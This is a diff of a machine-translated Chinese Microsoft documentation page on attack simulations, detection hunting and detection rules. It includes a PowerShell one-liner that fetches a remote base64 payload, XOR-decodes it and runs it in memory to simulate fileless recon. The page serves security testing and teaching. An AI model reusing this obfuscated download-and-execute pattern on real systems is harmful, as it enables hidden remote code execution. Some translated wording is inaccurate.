@@ -17,14 +17,15 @@ manager: dansimp
 audience: ITPro
 ms.collection:
 - M365-security-compliance
-- m365solution-evalutatemtp
+- m365solution-scenario
+- m365solution-pilotmtpproject
 ms.topic: conceptual
-ms.openlocfilehash: e6cf01f5540e383fb56e387cd07b455741221dc5
-ms.sourcegitcommit: 9d8d071659e662c266b101377e24549963e43fef
+ms.openlocfilehash: f165a34d5e9df2f3502a9d9c6230fed9b73b758b
+ms.sourcegitcommit: a83acd5b9eeefd2e20e5bac916fe29d09fb53de9
 ms.translationtype: MT
 ms.contentlocale: zh-TW
-ms.lasthandoff: 10/06/2020
-ms.locfileid: "48368090"
+ms.lasthandoff: 10/10/2020
+ms.locfileid: "48418142"
 ---
 # <a name="run-your-microsoft-threat-protection-attack-simulations"></a>執行 Microsoft 威脅防護攻擊模擬  
 
@@ -92,21 +93,23 @@ ms.locfileid: "48368090"
 由於您已在準備階段中設定試驗環境，因此請確定此案例有兩個裝置：測試裝置和網域控制站。
 
 1.  請確認您的租使用者已啟用 microsoft 威脅 [防護的 Microsoft 威脅](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service)。
+
 2.  驗證測試網域控制站設定：
+
     - 使用 Windows Server 2008 R2 或更新版本的裝置執行。
     - 測試網域控制站至 [Azure 高級威脅防護](https://docs.microsoft.com/azure/security-center/security-center-wdatp) ，並啟用 [遠端系統管理](https://docs.microsoft.com/windows-server/administration/server-manager/configure-remote-management-in-server-manager)。    
     - 確認 [AZURE ATP 和 Microsoft Cloud App Security integration](https://docs.microsoft.com/cloud-app-security/aatp-integration) 已啟用。
     - 在您的網域上建立測試使用者–不需要系統管理員許可權。
 
 3.  驗證 test device configuration：
-    <br>
-    a.  使用 Windows 10 版本1903或更新版本的裝置執行。
-    <br>
-    b.  測試裝置已加入測試網域。
-    <br>
-    c.  [開啟 Windows Defender 防毒軟體](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)。 如果您在啟用 Windows Defender 防病毒時遇到問題，請參閱此 [疑難排解主題](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)。
-    <br>
-    d.  確認測試裝置 [架至 Microsoft Defender 高級威脅防護 (MDATP) ](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)。
+ 
+    1.  使用 Windows 10 版本1903或更新版本的裝置執行。
+    
+    1.  測試裝置已加入測試網域。
+    
+    1.  [開啟 Windows Defender 防毒軟體](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)。 如果您在啟用 Windows Defender 防病毒時遇到問題，請參閱此 [疑難排解主題](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)。
+    
+    1.  確認測試裝置 [架至 Microsoft Defender 高級威脅防護 (MDATP) ](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)。
 
 如果您使用現有租使用者並實施裝置群組，請為測試裝置建立專用的裝置群組，並將它推入設定 UX 的最上層。
 
@@ -120,15 +123,17 @@ ms.locfileid: "48368090"
 2.  在測試裝置上開啟 [Windows PowerShell] 視窗。
 
 3.  複製下列類比腳本：
-```
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
-= [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
--UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
-$decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
-$i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
-```
->[!NOTE]
->如果您在網頁瀏覽器上開啟此檔，您可能會遇到複製完整文字但未遺失某些字元或引入額外分行符號的問題。 下載這份檔，並在 Adobe Reader 上開啟它。
+
+    ```powershell
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
+    = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
+    -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
+    $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
+    $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
+    ```
+    
+    > [!NOTE]
+    > 如果您在網頁瀏覽器上開啟此檔，您可能會遇到複製完整文字但未遺失某些字元或引入額外分行符號的問題。 下載這份檔，並在 Adobe Reader 上開啟它。
 
 4. 出現提示時，請貼上並執行複製的腳本。
 
@@ -141,7 +146,7 @@ $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encodin
 
 當此腳本完成時，您會看到 PowerShell 主控台上顯示一則訊息。
 
-```
+```console
 ran NetSessionEnum against [DC Name] with return code result 0      
 ```
 
@@ -333,96 +338,98 @@ Microsoft Defender ATP 偵測通常是以最常見的攻擊技術屬性為目標
 
 **開始搜尋**
 1.  開啟 security.microsoft.com 入口網站。
+
 2.  流覽至 **搜尋 > 高級搜尋**。
 
     ![M365 安全性中心入口網站導覽列中高級搜尋的螢幕擷取畫面](../../media/mtp/fig17.png) 
 
 3.  建立以收集電子郵件事件開始的查詢。
-    a.  在 [查詢] 窗格中，選取 [新增]。
-    b.  在架構中按兩下 [EmailEvents] 表格。
 
-```
-EmailEvents 
-```                                        
+    1.  在 [查詢] 窗格中，選取 [新增]。
+    
+    1.  在架構中按兩下 [EmailEvents] 表格。
 
-   c.   將時間範圍變更為過去24小時。 假設您在執行上述類比時所傳送的電子郵件是在過去24小時內，否則請變更時間範圍。
-   ![您可以變更時間範圍的螢幕擷取畫面。 開啟下拉式功能表以從 [時間範圍] 選項範圍中選擇](../../media/mtp/fig18.png) 
+        ```
+        EmailEvents 
+        ```                                        
 
+    1.  將時間範圍變更為過去24小時。 假設您在執行上述類比時所傳送的電子郵件是在過去24小時內，否則請變更時間範圍。
+    
+        ![您可以變更時間範圍的螢幕擷取畫面。 開啟下拉式功能表以從 [時間範圍] 選項範圍中選擇](../../media/mtp/fig18.png) 
 
-   d.   執行查詢。  根據試驗的環境而定，您可能會有許多結果。  
+    1.  執行查詢。  根據試驗的環境而定，您可能會有許多結果。  
 
->[!NOTE]
->請參閱下一個步驟，篩選選項以限制資料傳回。
+        > [!NOTE]
+        > 請參閱下一個步驟，篩選選項以限制資料傳回。
 
-   ![高級搜尋查詢結果的螢幕擷取畫面](../../media/mtp/fig19.png) 
+        ![高級搜尋查詢結果的螢幕擷取畫面](../../media/mtp/fig19.png) 
 
->[!NOTE]
->「高級搜尋」會以表格式資料顯示查詢結果。 您也可以選擇以其他格式類型（如圖表）來查看資料。    
+        > [!NOTE]
+        > 「高級搜尋」會以表格式資料顯示查詢結果。 您也可以選擇以其他格式類型（如圖表）來查看資料。    
 
-   e.   查看結果，查看是否可以識別您開啟的電子郵件。  最多可能需要2個小時的時間，郵件才會顯示在高級搜尋中。 如果電子郵件環境很大，而且有許多結果，您可能想要使用 [ **顯示篩選] 選項** 來尋找郵件。 
+    1.  查看結果，查看是否可以識別您開啟的電子郵件。  最多可能需要2個小時的時間，郵件才會顯示在高級搜尋中。 如果電子郵件環境很大，而且有許多結果，您可能想要使用 [ **顯示篩選] 選項** 來尋找郵件。 
 
-   在範例中，電子郵件是從 Yahoo 帳戶傳送。 按一下 [SenderFromDomain] 區段底下的 [ **+** **yahoo.com** ] 旁的圖示，然後按一下 [套用 **]，** 將選取的網域新增至查詢。  在執行類比以篩選結果的步驟1中，您應該使用傳送測試郵件所用的網域或電子郵件帳戶。  再次執行查詢以取得較小的結果集，以確認您看到類比中的郵件。
+        在範例中，電子郵件是從 Yahoo 帳戶傳送。 按一下 [SenderFromDomain] 區段底下的 [ **+** **yahoo.com** ] 旁的圖示，然後按一下 [套用 **]，** 將選取的網域新增至查詢。  在執行類比以篩選結果的步驟1中，您應該使用傳送測試郵件所用的網域或電子郵件帳戶。  再次執行查詢以取得較小的結果集，以確認您看到類比中的郵件。
    
-   ![篩選器的螢幕擷取畫面。 請使用篩選器縮小搜尋範圍，並尋找您要更快速的搜尋。](../../media/mtp/fig20.png) 
+        ![篩選器的螢幕擷取畫面。 請使用篩選器縮小搜尋範圍，並尋找您要更快速的搜尋。](../../media/mtp/fig20.png) 
 
+        ```console
+        EmailEvents 
+        | where SenderMailFromDomain == "yahoo.com"
+        ```
 
-```
-EmailEvents 
-| where SenderMailFromDomain == "yahoo.com"
-```
-
-   f.   按一下查詢中產生的資料列，以便檢查記錄。
-   ![選取高級搜尋結果時所開啟之檢查記錄側邊窗格的螢幕擷取畫面](../../media/mtp/fig21.png) 
-
+    1.  按一下查詢中產生的資料列，以便檢查記錄。
+   
+        ![選取高級搜尋結果時所開啟之檢查記錄側邊窗格的螢幕擷取畫面](../../media/mtp/fig21.png) 
 
 4.  現在，您已確認您可以看到電子郵件，新增附件的篩選器。 在環境中著重于所有包含附件的電子郵件。 在此情況下，會將焦點移到輸入電子郵件，而不是從您的環境寄出。 移除您已新增的任何篩選，以找出郵件並新增 "|其中**AttachmentCount > 0**和**EmailDirection**  ==  **"Inbound" "**
 
-下列查詢會顯示結果，其清單比您的所有電子郵件事件的初始查詢更短：
+    下列查詢會顯示結果，其清單比您的所有電子郵件事件的初始查詢更短：
 
-```
-EmailEvents 
-| where AttachmentCount > 0 and EmailDirection == "Inbound"
+    ```console
+    EmailEvents 
+    | where AttachmentCount > 0 and EmailDirection == "Inbound"
 
-```
+    ```
 
 5.  接下來，包含附件的相關資訊 (例如：檔案名、雜湊) 結果集。 若要這麼做，請加入 **EmailAttachmentInfo** 表格。 在此情況下，要用於加入的一般欄位是 **NetworkMessageId** 和 **RecipientObjectId**。
 
-下列查詢也包含其他行 "| **project-Rename EmailTimestamp = Timestamp**"，可協助識別與您將在下一個步驟中新增之檔案動作相關的電子郵件與時間戳記有關的時間戳記。
+    下列查詢也包含其他行 "| **project-Rename EmailTimestamp = Timestamp**"，可協助識別與您將在下一個步驟中新增之檔案動作相關的電子郵件與時間戳記有關的時間戳記。
 
-```
-EmailEvents 
-| where AttachmentCount > 0 and EmailDirection == "Inbound"
-| project-rename EmailTimestamp=Timestamp 
-| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
-```
+    ```console
+    EmailEvents 
+    | where AttachmentCount > 0 and EmailDirection == "Inbound"
+    | project-rename EmailTimestamp=Timestamp 
+    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
+    ```
 
 6.  接下來，使用**EmailAttachmentInfo**表格中的**SHA256**值，尋找在該雜湊的端點) 上發生的**DeviceFileEvents** (檔案動作。  這裡的一般欄位將會是附件的 SHA256 雜湊。
 
-產生的表格現在會包含端點)  (的詳細資料，例如，裝置名稱、已完成的動作 (在此情況下，篩選為只包括 FileCreated 事件) ，以及儲存檔案的位置。 也會包含與處理常式相關聯的帳戶名稱。
+    產生的表格現在會包含端點)  (的詳細資料，例如，裝置名稱、已完成的動作 (在此情況下，篩選為只包括 FileCreated 事件) ，以及儲存檔案的位置。 也會包含與處理常式相關聯的帳戶名稱。
 
-```
-EmailEvents 
-| where AttachmentCount > 0 and EmailDirection == "Inbound"
-| project-rename EmailTimestamp=Timestamp 
-| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId 
-| join DeviceFileEvents on SHA256 
-| where ActionType == "FileCreated"
-```
+    ```console
+    EmailEvents 
+    | where AttachmentCount > 0 and EmailDirection == "Inbound"
+    | project-rename EmailTimestamp=Timestamp 
+    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId 
+    | join DeviceFileEvents on SHA256 
+    | where ActionType == "FileCreated"
+    ```
 
-您現在已經建立了一個查詢，它會識別所有使用者開啟或儲存附件的輸入電子郵件。 您也可以精煉此查詢，以篩選特定寄件者網域、檔案大小、檔案類型等等。
+    您現在已經建立了一個查詢，它會識別所有使用者開啟或儲存附件的輸入電子郵件。 您也可以精煉此查詢，以篩選特定寄件者網域、檔案大小、檔案類型等等。
 
 7.  函數是一種特殊的加入方式，可讓您提取有關檔案的更多 TI 資料，如檔傳播、簽署者資訊等等。 若要取得檔案的詳細資料，請使用 **FileProfile ( # B1 ** 函數豐富：
 
-```
-EmailEvents 
-| where AttachmentCount > 0 and EmailDirection == "Inbound"
-| project-rename EmailTimestamp=Timestamp 
-| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
-| join DeviceFileEvents on SHA256 
-| where ActionType == "FileCreated"
-| distinct SHA1
-| invoke FileProfile()
-```
+    ```console
+    EmailEvents 
+    | where AttachmentCount > 0 and EmailDirection == "Inbound"
+    | project-rename EmailTimestamp=Timestamp 
+    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
+    | join DeviceFileEvents on SHA256 
+    | where ActionType == "FileCreated"
+    | distinct SHA1
+    | invoke FileProfile()
+    ```
 
 
 **建立偵測**
@@ -435,15 +442,15 @@ EmailEvents
     
     ![可在 [高級搜尋] 頁面中按一下 [建立偵測規則] 的螢幕擷取畫面](../../media/mtp/fig22.png) 
 
->[!NOTE]
->如果您按一下 [ **建立偵測規則** ]，並在查詢中有語法錯誤，則您的偵測規則不會儲存。 請加倍檢查您的查詢，確定沒有任何錯誤。 
+    > [!NOTE]
+    > 如果您按一下 [ **建立偵測規則** ]，並在查詢中有語法錯誤，則您的偵測規則不會儲存。 請加倍檢查您的查詢，確定沒有任何錯誤。 
 
 
 2.  請填入必要的欄位，其中包含可讓安全性小組瞭解提醒的資訊、它的產生原因，以及您預期採取的動作。 
 
     ![[建立偵測規則] 頁面的螢幕擷取畫面，您可以在其中定義警示詳細資料](../../media/mtp/fig23.png)
 
-請務必以清晰的方式填寫欄位，以協助下一使用者對此偵測規則警示作出明智的決定。 
+    請務必以清晰的方式填寫欄位，以協助下一使用者對此偵測規則警示作出明智的決定。 
 
 3.  選取此警示會影響哪些實體。 在此情況下，請選取 [ **裝置** 和 **信箱**]。
 
@@ -458,7 +465,7 @@ EmailEvents
 
     ![[建立偵測規則] 頁面的螢幕擷取畫面，您可以在其中設定警示規則的範圍，以管理您將看到的結果預期](../../media/mtp/fig26.png) 
 
-在此試驗中，您可能會想要將此規則限制在實際執行環境中的測試裝置子集。
+    在此試驗中，您可能會想要將此規則限制在實際執行環境中的測試裝置子集。
 
 6.  選取 **[建立]**。 然後，選取導覽窗格中的 **自訂偵測規則** 。
  
@@ -466,9 +473,9 @@ EmailEvents
 
     ![顯示規則和執行詳細資料之 [偵測規則] 頁面的螢幕擷取畫面](../../media/mtp/fig27b.png) 
 
-在此頁面中，您可以選取要開啟詳細資料頁面的偵測規則。 
+    在此頁面中，您可以選取要開啟詳細資料頁面的偵測規則。 
 
-![[電子郵件附件] 頁面的螢幕擷取畫面，您可以在其中看到規則執行、觸發的警示和動作狀態、編輯偵測等等。](../../media/mtp/fig28.png) 
+    ![[電子郵件附件] 頁面的螢幕擷取畫面，您可以在其中看到規則執行、觸發的警示和動作狀態、編輯偵測等等。](../../media/mtp/fig28.png) 
 
 ### <a name="additional-advanced-hunting-walk-through-exercises"></a>其他的高級搜尋指導-透過練習
 
@@ -477,7 +484,7 @@ EmailEvents
 >[!NOTE]
 >請使用您自己的 GitHub 帳戶進行準備，以在試驗測試實驗室環境中執行搜尋查詢。  
 
-| **標題** | **描述** | **下載所用的** | **手錶 YouTube** | **要使用的 CSL 檔案** |
+|  職稱  |  描述  |  下載所用的  |  手錶 YouTube  |  要使用的 CSL 檔案  |
 |:-----|:-----|:-----|:-----|:-----|
 | 第1集： KQL 基礎 | 我們將涵蓋 Microsoft 威脅防護中高級搜尋功能的基礎知識。 深入瞭解可用的高級搜尋資料和基本 KQL 語法及運算子。 | [ 時](https://aka.ms/MTP15JUL20_MP4) | [YouTube](https://youtu.be/0D9TkGjeJwM) | [第1集： Git 中的 CSL 檔案](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl) |
 | 劇集2：聯接 | 我們將繼續深入瞭解高級搜尋中的資料，以及如何將資料表結合在一起。 瞭解內部、外部、unique 和半圓的連接，以及預設 Kusto innerunique join 的細微差別。 | [時](https://aka.ms/MTP22JUL20_MP4) | [YouTube](https://youtu.be/LMrO6K5TWOU) | [劇集2： Git 中的 CSL 檔案](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl) |
